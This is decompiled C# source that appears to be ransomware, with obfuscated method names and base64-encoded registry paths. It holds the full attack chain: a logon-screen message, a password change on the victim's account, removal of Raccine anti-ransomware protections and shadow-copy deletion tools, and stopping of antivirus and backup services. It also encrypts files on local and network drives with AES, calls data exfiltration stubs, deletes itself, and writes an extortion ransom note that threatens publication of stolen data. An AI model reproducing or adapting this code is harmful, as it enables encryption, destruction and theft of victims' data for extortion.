	public static void NHzvTatQZhTwKonTK(string p0 = "", string KIIbYrKbucelZ = "SW5mb3JtYXRpb24uLi4=", string OFNVwgWVfswlvJj = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		p0 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=";
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(m000003(p0), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue("LegalNoticeCaption", m000003(KIIbYrKbucelZ));
				registryKey.SetValue("LegalNoticeText", m000003(OFNVwgWVfswlvJj));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			p0 = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt";
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(m000003(p0), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue("legalnoticecaption", m000003(KIIbYrKbucelZ));
				registryKey.SetValue("legalnoticetext", m000003(OFNVwgWVfswlvJj));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void xLkmmTTSHp()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (f000018 == "YES" && !string.IsNullOrEmpty(f000019) && !string.IsNullOrEmpty(EiyrcFiAoaX))
				{
					NHzvTatQZhTwKonTK("", f000019, EiyrcFiAoaX);
				}
				else
				{
					NHzvTatQZhTwKonTK();
				}
			}
		}
		catch
		{
		}
	}

	public static void m000004(string iKyctWUHNaEkVj = "SW5mb3JtYXRpb24uLi4=", string UwFkiThTFY = "QWxsIHlvdXIgZmlsZXMgYXJlIHNlY3VyZWQsIHBsZWFzZSByZWFkIHRoZSB0ZXh0IG5vdGUgbG9jYXRlZCBpbiB5b3VyIGRlc2t0b3AuLi4=")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(m000003(iKyctWUHNaEkVj));
		val.set_BalloonTipText(m000003(UwFkiThTFY));
		val.ShowBalloonTip(30000);
	}

	public static void pkNBJGqTbajgL(string p0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		m000002("net.exe", "user " + text + " " + p0);
	}

	public static void wDQhPDGrMto(string p0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "powershell.exe";
		processStartInfo.Arguments = "& " + p0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool sMlBAtMqAgeMq(string p0, string p1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(p0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(p1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(p0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool CRggSgCOOkjunf(string p0)
	{
		try
		{
			NxIyepnTFBO nxIyepnTFBO = new NxIyepnTFBO();
			DriveInfo[] drives = DriveInfo.GetDrives();
			nxIyepnTFBO.nvRebewysN = Path.GetPathRoot(p0);
			DriveInfo driveInfo = drives.FirstOrDefault(nxIyepnTFBO.m000013);
			return driveInfo != null && driveInfo.DriveFormat == "NTFS";
		}
		catch
		{
			return false;
		}
	}

	public static void m000005()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string p = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cSW1hZ2UgRmlsZSBFeGVjdXRpb24gT3B0aW9ucw==";
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(m000003(p), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey("vssadmin.exe");
					registryKey.DeleteSubKey("wmic.exe");
					registryKey.DeleteSubKey("wbadmin.exe");
					registryKey.DeleteSubKey("bcdedit.exe");
					registryKey.DeleteSubKey("powershell.exe");
					registryKey.DeleteSubKey("diskshadow.exe");
					registryKey.DeleteSubKey("net.exe");
					registryKey.Close();
				}
				p = "U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXEV2ZW50TG9nXEFwcGxpY2F0aW9u";
				registryKey = Registry.LocalMachine.OpenSubKey(m000003(p), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey("Raccine");
					registryKey.Close();
				}
				p = "U09GVFdBUkU=";
				registryKey = Registry.LocalMachine.OpenSubKey(m000003(p), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey("Raccine");
					registryKey.Close();
				}
				p = "U09GVFdBUkU=";
				registryKey = Registry.CurrentUser.OpenSubKey(m000003(p), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey("Raccine");
					registryKey.Close();
				}
			}
			catch
			{
			}
			m000002("taskkill", "/F /IM RaccineSettings.exe");
			m000002("reg", "delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Raccine Tray\" /F");
			m000002("reg", "delete HKCU\\Software\\Raccine /F");
			m000002("schtasks", "/DELETE /TN \"Raccine Rules Updater\" /F");
		}
		catch
		{
		}
	}

	public static void m000006(string p0, byte[] p1)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes("GotAllDone");
			using FileStream fileStream = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(p1, 0, p1.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void XoFivSFAPFl()
	{
		string p = "U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcRmlsZVN5c3RlbQ==";
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(m000003(p), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue("LongPathsEnabled", 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string p0, int p1, IntPtr p2, ref int p3);

	private static string m000007(string jyXjQtARhTMzoJ, int p1 = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(p1);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(jyXjQtARhTMzoJ, 1, intPtr, ref p1) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void OQGiATnqshpg()
	{
		m000002("cmd.exe", "/C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288 “%s” & Del /f /q “%s”");
		string text = "/C choice /C Y /N /D Y /T 3 & Del ";
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void m000008(string p0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(p0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(p0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(p0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(p0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(f000025, "File: " + p0 + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string m000009()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform != PlatformID.Win32Windows)
		{
			if (oSVersion.Platform == PlatformID.Win32NT)
			{
				switch (version.Major)
				{
				case 3:
					text = "NT 3.51";
					break;
				case 4:
					text = "NT 4.0";
					break;
				case 5:
					text = ((version.Minor != 0) ? "XP" : "2000");
					break;
				case 6:
					text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
					break;
				case 10:
					text = "10";
					break;
				}
			}
		}
		else
		{
			switch (version.Minor)
			{
			case 10:
				text = ((version.Revision.ToString() == "2222A") ? "98SE" : "98");
				break;
			case 90:
				text = "Me";
				break;
			case 0:
				text = "95";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string iqbhckCLJPzmcb(string p0)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine("------------------\r\n| What happened? |\r\n------------------\r\n\r\nYour network was ATTACKED, your computers and servers were LOCKED,\r\nYour private data was DOWNLOADED:\r\n - Contracts\r\n - Customers data\r\n - Finance\r\n - HR\r\n - Databases\r\n - And more other...\r\n\r\n----------------------\r\n| What does it mean? |\r\n----------------------\r\n\r\nIt means that soon mass media, your partners and clients WILL KNOW about your PROBLEM.\r\n\r\n--------------------------\r\n| How it can be avoided? |\r\n--------------------------\r\n\r\nIn order to avoid this issue,\r\nyou are to COME IN TOUCH WITH US no later than within 3 DAYS and conclude the data recovery and breach fixing AGREEMENT.\r\n\r\n-------------------------------------------\r\n| What if I do not contact you in 3 days? |\r\n-------------------------------------------\r\n\r\nIf you do not contact us in the next 3 DAYS we will begin DATA publication.\r\nWe will post information about hacking of your company on our twitter https://twitter.com/RobinHoodLeaks or https://parler.com/user/RobinHoodLeaks\r\n\r\n-----------------------------\r\n| I can handle it by myself |\r\n-----------------------------\r\n\r\nIt is your RIGHT, but in this case all your data will be published for public USAGE.\r\n\r\n-------------------------------\r\n| I do not fear your threats! |\r\n-------------------------------\r\n\r\nThat is not the threat, but the algorithm of our actions.\r\nIf you have hundreds of millions of UNWANTED dollars, there is nothing to FEAR for you.\r\nThat is the EXACT AMOUNT of money you will spend for recovery and payouts because of PUBLICATION.\r\nYou are exposing yourself to huge penalties with lawsuits and government if we both don't find an agreement. \r\nWe have seen it before cases with multi million costs in fines and lawsuits,\r\nnot to mention the company reputation and losing clients trust and the medias calling non-stop for answers. \r\n\r\n--------------------------\r\n| You have convinced me! |\r\n--------------------------\r\n\r\nThen you need to CONTACT US, there is few ways to DO that.\r\n\r\n\t\t   ---Secure method---\r\n\r\n   a) Download a qTOX client: https://tox.chat/download.html\r\n   b) Install the qTOX client and register account\r\n   c) Add our qTOX ID: 671263E7BC06103C77146A5ABB802A63F53A42B4C4766329A5F04D2660C99A3611635CC36B3A\r\n   d) Write us extension of your encrypted files .NARUMI\r\n\r\nOur LIVE SUPPORT is ready to ASSIST YOU on this chat.\r\n\r\n----------------------------------------\r\n| What will I get in case of agreement |\r\n----------------------------------------\r\n\r\nYou WILL GET full DECRYPTION of your machines in the network, DELETION your data from our servers, \r\nRECOMMENDATIONS for securing your network perimeter.\r\n\r\nAnd the FULL CONFIDENTIALITY ABOUT INCIDENT.\r\n\r\n----------------------------------------------------------------------------------");
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine("KEYID: ");
				streamWriter.WriteLine(p0);
				if (YazilaoopZ)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine("PC Hardware ID: ");
					streamWriter.WriteLine("");
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(p0) && !PAOJgADrbjEa)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + p0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(f000025, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void LeefKZPaDd(string[] p0, string[] p1, string[] p2, string p3, string p4)
	{
		MCSuzJljyGwrZ mCSuzJljyGwrZ = new MCSuzJljyGwrZ();
		mCSuzJljyGwrZ.f000039 = p1;
		mCSuzJljyGwrZ.CToRljeBfHM = p2;
		mCSuzJljyGwrZ.hSfGYaylYziGu = p3;
		mCSuzJljyGwrZ.f00003a = p4;
		if (RaNDyCdUClri && !"Windows 8".Contains("XP") && !"Windows 8".Contains("Windows 7"))
		{
			c00002c.AQxYtYywpEIpR();
		}
		bGfpmpYMCsNkyjcK = Convert.FromBase64String(mCSuzJljyGwrZ.hSfGYaylYziGu);
		DriveInfo[] array = null;
		if (p0[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length != 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = m000007(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !ZmKssmQIdPi.Contains(text))
							{
								ZmKssmQIdPi.Add(text);
							}
							else if (!ZmKssmQIdPi.Contains(array[i].Name))
							{
								ZmKssmQIdPi.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!ZmKssmQIdPi.Contains(array[i].Name))
							{
								ZmKssmQIdPi.Add(array[i].Name);
							}
						}
					}
					else if (!ZmKssmQIdPi.Contains(array[i].Name))
					{
						ZmKssmQIdPi.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < p0.Length; j++)
			{
				if (!ZmKssmQIdPi.Contains(p0[j]))
				{
					ZmKssmQIdPi.Add(p0[j]);
				}
			}
		}
		if (ZmKssmQIdPi.Contains(m000003("Qzpc")) && f00001e == "YES")
		{
			ZmKssmQIdPi.Remove(m000003("Qzpc"));
		}
		Parallel.ForEach(ZmKssmQIdPi, mCSuzJljyGwrZ.m000014);
	}

	public static void uBTjgvutOlsTJ(string p0, string[] p1, string p2, string[] p3, string p4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (f000016 == "NO")
		{
			if (f000023 == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && CRggSgCOOkjunf(p0))
			{
				c000020 c20 = null;
				try
				{
					c20 = new c000020(p0.Replace("\\", ""));
				}
				catch
				{
					list = DrqYGjBvTosyB(p0, p1, p2, p3, p4);
					return;
				}
				try
				{
					m00000a(c20.ToArray().ToList(), p1, p2, p3, p4);
					return;
				}
				catch (Exception)
				{
					list = DrqYGjBvTosyB(p0, p1, p2, p3, p4);
					return;
				}
			}
			list = DrqYGjBvTosyB(p0, p1, p2, p3, p4);
			return;
		}
		list = c000003.SearchFiles(p0);
		foreach (string text in p1)
		{
			foreach (string item in list)
			{
				if (p3.Length != 0)
				{
					int num = 0;
					while (num < p3.Length)
					{
						string value = p3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03be;
					}
				}
				if ((f00001b == "NO" && !item.EndsWith(text)) || f000006.Contains(item))
				{
					continue;
				}
				if (BBqvZtJMKtZyzF == "YES")
				{
					try
					{
						if (uruahRFIszrntX.bURwEzWcMZKaoi(item))
						{
							uruahRFIszrntX.BBxxokkeNIlNHfR(item);
						}
					}
					catch
					{
					}
				}
				f000006.Add(item);
				if (HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(item)))
				{
					/*Error: Could not find block for branch target IL_01ca*/;
				}
				HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(item));
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (f00000f == "YES" && fileStream.Length > Convert.ToInt32(f000010) * 1024 * 1024 && !list3.Contains(text))
					{
						if (f000012 == "YES")
						{
							foreach (string item2 in f000013)
							{
								if (item.ToLower().EndsWith(item2) && f000014 == "YES")
								{
									if (Convert.ToInt32(f000015) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && f000014 == "NO")
								{
									try
									{
										c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] p5 = c000018.KQanXSigbuDh(item, Convert.ToInt32(f000010) * 1024 * 1024);
						byte[] p6 = c000018.SvtZMRYDytMixf(p5, Convert.FromBase64String(p4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						c000018.EHTmbBVFpgxa(item, p6);
						if (p2 != ".*")
						{
							File.Move(item, item + p2);
						}
					}
					else if (p2 != ".*")
					{
						WyOQIuKbfF(item, item + p2, bGfpmpYMCsNkyjcK);
					}
					else
					{
						WyOQIuKbfF(item, item + ".part", bGfpmpYMCsNkyjcK);
					}
				}
				catch (Exception)
				{
				}
				IL_03be:;
			}
		}
	}

	public static void m00000a(List<string> p0, string[] p1, string p2, string[] p3, string p4)
	{
		mDsrdwsfBAgqx mDsrdwsfBAgqx = new mDsrdwsfBAgqx();
		mDsrdwsfBAgqx.vJUzSMoRbycwzG = p0;
		mDsrdwsfBAgqx.f00003e = p2;
		mDsrdwsfBAgqx.nBTsxqqCcIrA = p3;
		mDsrdwsfBAgqx.f000002 = p4;
		mDsrdwsfBAgqx.MWjzSWdUTiapH = new List<string> { "" };
		if (f00001b == "NO")
		{
			Parallel.ForEach(p1, mDsrdwsfBAgqx.m000017);
		}
		else
		{
			Parallel.ForEach(mDsrdwsfBAgqx.vJUzSMoRbycwzG, mDsrdwsfBAgqx.m000018);
		}
	}

	private static void WyOQIuKbfF(string p0, string p1, byte[] p2)
	{
		//Discarded unreachable code: IL_0232
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(p1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(p2, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(p0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (p1.Length <= 0)
				{
					/*Error: Could not find block for branch target IL_0233*/;
				}
				FileStream fileStream3 = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				if (f000012 == "YES")
				{
					foreach (string item in f000013)
					{
						if (p0.ToLower().EndsWith(item) && f000014 == "YES")
						{
							if (Convert.ToInt32(f000015) * 1024 * 1024 > fileStream3.Length)
							{
								try
								{
									c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", p0);
								}
								catch
								{
								}
							}
						}
						else if (p0.ToLower().EndsWith(item) && f000014 == "NO")
						{
							try
							{
								c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", p0);
							}
							catch
							{
							}
						}
					}
				}
				fileStream3.Dispose();
				int num2 = 1000000;
				while (true)
				{
					try
					{
						while (File.Exists(p0) && num2 >= 0)
						{
							File.Delete(p0);
						}
					}
					catch
					{
						num2--;
						continue;
					}
					break;
				}
				if (p1.EndsWith(".part"))
				{
					File.Move(p1, p1.Replace(".part", ""));
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void m00000b(string p0, string p1, byte[] p2, byte[] p3 = null)
	{
		try
		{
			if (f000012 == "YES")
			{
				FileStream fileStream = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in f000013)
				{
					if (p0.ToLower().EndsWith(item) && f000014 == "YES")
					{
						if (Convert.ToInt32(f000015) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", p0);
							}
							catch
							{
							}
						}
					}
					else if (p0.ToLower().EndsWith(item) && f000014 == "NO")
					{
						try
						{
							c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", p0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (p0 != p1)
		{
			File.Move(p0, p1);
			p0 = p1;
		}
		byte[] bytes = sAdFSOOagDt.m00002a(File.ReadAllBytes(p0), p2, p3);
		File.WriteAllBytes(p0, bytes);
		f00002b++;
	}

	private static void fsRkhosBCvdFpjZ(string p0, string p1, byte[] p2)
	{
		cTttKVwFNmpq cTttKVwFNmpq = new cTttKVwFNmpq();
		cTttKVwFNmpq.f000044 = p0;
		cTttKVwFNmpq.eedfnXcwSQkQNFbIx = p1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string eedfnXcwSQkQNFbIx = cTttKVwFNmpq.eedfnXcwSQkQNFbIx;
			FileStream fileStream = new FileStream(eedfnXcwSQkQNFbIx, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(p2, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (QtTrkEhpkGUJgMO == "YES")
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(cTttKVwFNmpq.f000044, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(cTttKVwFNmpq.f000044, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream2 = new FileStream(cTttKVwFNmpq.f000044, FileMode.Open);
				int num2;
				while ((num2 = fileStream2.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num2);
				}
				fileStream2.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (cTttKVwFNmpq.eedfnXcwSQkQNFbIx.Length > 0)
				{
					if (f000012 == "YES")
					{
						FileStream fileStream3 = new FileStream(cTttKVwFNmpq.f000044, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in f000013)
						{
							if (cTttKVwFNmpq.f000044.ToLower().EndsWith(item) && f000014 == "YES")
							{
								if (Convert.ToInt32(f000015) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", cTttKVwFNmpq.f000044);
									}
									catch
									{
									}
								}
							}
							else if (cTttKVwFNmpq.f000044.ToLower().EndsWith(item) && f000014 == "NO")
							{
								try
								{
									c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", cTttKVwFNmpq.f000044);
								}
								catch
								{
								}
							}
						}
						fileStream3.Dispose();
					}
					Thread thread = new Thread(cTttKVwFNmpq.m00001d);
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (cTttKVwFNmpq.eedfnXcwSQkQNFbIx.EndsWith(".part"))
					{
						File.Move(cTttKVwFNmpq.eedfnXcwSQkQNFbIx, cTttKVwFNmpq.eedfnXcwSQkQNFbIx.Replace(".part", ""));
					}
				}
				else
				{
					Thread thread2 = new Thread(cTttKVwFNmpq.m00001e);
					thread2.Priority = ThreadPriority.Normal;
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(f000025, "File: " + cTttKVwFNmpq.f000044 + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void m00000c()
	{
		List<string> vfIRuRDoHW = VfIRuRDoHW;
		if (f000032 == null)
		{
			f000032 = m00000d;
		}
		Parallel.ForEach(vfIRuRDoHW, f000032);
		List<string> zSMEaXFyFht = ZSMEaXFyFht;
		if (f000033 == null)
		{
			f000033 = m00000e;
		}
		Parallel.ForEach(zSMEaXFyFht, f000033);
		if (f000022 == "YES")
		{
			string[] yacSoacXjaCUC = YacSoacXjaCUC;
			if (f000034 == null)
			{
				f000034 = m00000f;
			}
			Parallel.ForEach(yacSoacXjaCUC, f000034);
		}
		if (!"Windows 8".Contains("XP"))
		{
			wDQhPDGrMto(edpjkmWiBB);
		}
		else
		{
			List<string> source = f00000a;
			if (f000035 == null)
			{
				f000035 = m000010;
			}
			Parallel.ForEach(source, f000035);
		}
		List<string> source2 = pmzwKqsyDlmmF;
		if (f000036 == null)
		{
			f000036 = m000011;
		}
		Parallel.ForEach(source2, f000036);
	}

	private static void m00000d(string p0)
	{
		m000002("sc.exe", p0);
	}

	private static void m00000e(string p0)
	{
		m000002("taskkill.exe", p0);
	}

	private static void m00000f(string p0)
	{
		m000002("taskkill.exe", "/IM " + p0 + " /f");
	}

	private static void m000010(string p0)
	{
		m000002("vssadmin.exe", p0);
	}

	private static void m000011(string p0)
	{
		m000002("del.exe", p0);
	}

	static GhAMvbuoccW()
	{
		Strings.CreateGetStringDelegate(typeof(GhAMvbuoccW));
		gheRqfduEuJ = "EVET";
		bGfpmpYMCsNkyjcK = null;
		HirTGWkSHczrmbY = "NO";
		nsiwXjKpMUO = "100000000";
		ZmKssmQIdPi = new List<string>();
		f000001 = new List<string>();
		zMQimCitOD = "NO";
		f000002 = "";
		f000003 = "";
		EXVykcHaTCNay = "";
		szjPprKwdybiP = "NO";
		IwCCvRldil = 0;
		BBqvZtJMKtZyzF = "NO";
		MkWPFkyuHrLz = "NO";
		tGBTkHzktdbqpsN = "NO";
		IHkGIfOFsBs = "0";
		PktefsOLxgM = "NO";
		lvMwbEyyvL = "NO";
		f000004 = "NO";
		f000005 = "NO";
		FBdBqWxFZQgyhcDd = new List<string>
		{
			"lsass.exe", "svchst.exe", "crcss.exe", "chrome32.exe", "firefox.exe", "calc.exe", "mysqld.exe", "dllhst.exe", "opera32.exe", "memop.exe",
			"spoolcv.exe", "ctfmom.exe", "SkypeApp.exe"
		};
		HMEbcaxMfcYzgl = new List<string>();
		wbKIZmscSBasobt = "NO";
		dVUrkAuvmqKS = "NO";
		uSiPWDmilru = "NO";
		f000006 = new List<string>();
		f000007 = "NO";
		f000008 = "8a3cd836-e8bb-428d-9e0b-d62e18cfe2d4";
		rmNaxrdaErS = "YES";
		nnUkiNRMVi = "NO";
		f000009 = new List<string>
		{
			"start Dnscache /y", "start FDResPub /y", "start SSDPSRV /y", "start upnphost /y", "stop avpsus /y", "stop McAfeeDLPAgentService /y", "stop mfewc /y", "stop BMR Boot Service /y", "stop NetBackup BMR MTFTP Service /y", "stop DefWatch /y",
